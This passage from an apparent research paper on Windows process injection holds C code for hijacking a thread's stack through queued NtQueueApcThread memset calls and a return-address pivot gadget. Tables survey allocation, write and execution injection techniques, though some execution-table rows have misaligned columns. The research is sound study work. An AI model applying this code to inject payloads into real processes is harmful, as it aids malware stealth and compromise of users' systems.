### Alternative Approach

The stack can be read by the injector process using a memory read primitive, such as `ReadProcessMemory`, and then embedded in the payload.

### Immediate Pivot to New Memory

Pivoting to a new memory location immediately will only corrupt the return address and another QWORD above it. This QWORD is reserved for the leaf function and is unused by the five leaf functions mentioned, so it can be safely overwritten without needing restoration. The payload must restore the `RSP` and the return address.

#### Register Management

- **Volatile Registers**: The five leaf functions do not rely on volatile registers when transferring control to the kernel, making it safe to modify them.
- **Non-Volatile Registers**: These must be restored. However, calling other (system) functions from the payload does not modify non-volatile registers, as they are restored before control returns to the main payload. If the payload uses only volatile registers, no register restoration is needed.

### Safe Version (Including Cleanup)

```c
// Ensure the payload does not modify non-volatile registers, copies the saved return address to the original TOS location, and restores RSP and control when done, e.g., using GADGET_pivot.

HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
SuspendThread(t);

CONTEXT context;
context.ContextFlags = CONTEXT_ALL;
GetThreadContext(t, &context);

DWORD64 orig_tos = (DWORD64)context.Rsp;
DWORD64 tos = orig_tos - 0x2000; // 0x2000 experimentally works…

// Grow the stack to accommodate the new stack
for (DWORD64 i = orig_tos - 0x1000; i >= tos; i -= 0x1000)
{
    (*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(i), (void*)0, 1);
}

// Write the new stack
payload[saved_tos] = orig_tos;
for (int i = 0; i < sizeof(payload); i++)
{
    (*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(tos + i), (void*)*(((BYTE*)payload) + i), 1);
}

// Save the original return address into the new stack
(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memmove"), (void*)(payload[saved_return_address]), (void*)orig_tos, 8);

// Overwrite the original return address with GADGET_pivot
for (int i = 0; i < sizeof(DWORD64); i++)
{
    (*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + i), (void*)(((BYTE*)&GADGET_pivot)[i]), 1);
}

// Overwrite the original TOS+8 with the new TOS address (no need to restore this since it's shadow stack and not used by the leaf function)
for (int i = 0; i < sizeof(DWORD64); i++)
{
    (*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + 8 + i), (void*)(((BYTE*)&tos)[i]), 1);
}

ResumeThread(t);
```

### Evaluation

- **Prerequisites**: The thread must be in an alertable state, and the target address must be RX (at least).
- **Limitations**: None.
- **CFG/CIG-readiness**: Not affected.
- **Control over registers**: No.
- **Stability**: Atomicity is not an issue since all memory writes are queued and happen together.
- **Cleanup required**: Yes. The original thread state, stack, and non-volatile registers need to be restored.

### Shatter-like Techniques

There are seven Shatter-like techniques: WordWarping, Hyphentension, AutoCourgette, Streamception, Oleum, ListPLanting, and Treepoline, as described by Odzhan [here](https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/). Due to time constraints, we are not providing detailed analysis and PoCs here, but they will be included in a future version of the paper and PINJECTRA.

### Summary of Techniques

#### Memory Allocation

| Allocation Technique | Memory Access | CFG-valid? | Stable? |
|----------------------|---------------|------------|---------|
| VirtualAllocEx        | RWX           | Yes        | Yes     |
| Image (.data slack), Stack, Heap | RW | No | .data slack – Yes, Stack/Heap – depends |
| NtMapViewOfSection    | RWX           | Yes        | Yes     |

#### Memory Write

| Write Technique       | Prerequisites/Limitations | Address Control | Stable? | Main APIs Used |
|-----------------------|---------------------------|-----------------|---------|----------------|
| WriteProcessMemory    | None                      | Full            | Yes     | OpenProcess, WriteProcessMemory |
| Existing Shared Memory | Process must have a RW Shared Memory section | None | May be unstable | OpenFileMapping, MapViewOfFile, OpenProcess, VirtualQueryEx, ReadProcessMemory |
| Atom Bombing          | Thread must be in alertable state | Full | Yes | OpenThread, GlobalAtomAdd, ntdll!NtQueueApcThread |
| NtMapViewOfSection    | Cannot write on allocated memory (e.g., Image, Stack, Heap) | N/A | Yes | CreateFileMapping, MapViewOfFile, OpenProcess, ntdll!NtMapViewOfSection |
| memset/memmove        | Thread must be in alertable state | Full | Yes | N/A |

#### Execution Techniques

| Execution Method                  | Family | Prerequisites/Limitations | CFG/CIG Constraints | Controlled Registers | Cleanup/Stability | Main APIs Used |
|-----------------------------------|--------|---------------------------|---------------------|----------------------|-------------------|----------------|
| DLL injection via CreateRemoteThread | DLL Injection | (1) DLL on disk; (2) DLL path in target process memory; (3) Loader lock restrictions (CIG) | DLL must be MSFT-signed | None (N/A – runs native code) | OpenProcess + CreateRemoteThread / OpenThread + QueueUserAPC / ntdll!NtQueueApcThread |
| CreateRemoteThread                | Target address must be RX (at least) (CFG) | Target address must be CFG-valid | RCX | OpenProcess, CreateRemoteThread |
| APC                               | (1) Target address must be RX (at least); (2) Thread must be in alertable state (CFG) | Target address must be CFG-valid | RCX (also RDX and R8 for NtQueueApcThread) | OpenThread, QueueUserAPC / ntdll!NtQueueApcThread |
| Thread execution hijacking        | Target address must be RX (at least) (CFG) | RSP (if set) must be within stack limits | All non-volatile registers, in some cases also volatile registers | Cleanup needed for the original thread to resume execution | OpenThread, SuspendThread, ResumeThread, SetThreadContext |
| Windows hook DLL injection        | (1) DLL on disk; (2) target process must have user32.dll loaded (and a message loop thread) (CIG) | DLL must be MSFT-signed | None (N/A – runs native code) | SetWindowsHookEx |
| Ghost-writing                     | Target address must be RX (at least) | None | All non-volatile registers, in some cases also volatile registers | Cleanup needed for the original thread to resume execution. May be tricky! | OpenThread, GetThreadContext, SetThreadContext, SuspendThread, ResumeThread |
| SetWindowLong/SetWindowLongPtr    | (1) A window belonging to the target process, that uses the extra window bytes to store a pointer to an object with a virtual function table. Specifically, explorer’s Shell Tray Window uses the first 8 extra window bytes to store a pointer to a CTray object (CFG) | Target address must be CFG-valid | None | Cleanup needed: the original CTray object must be restored, and special consideration must be given. |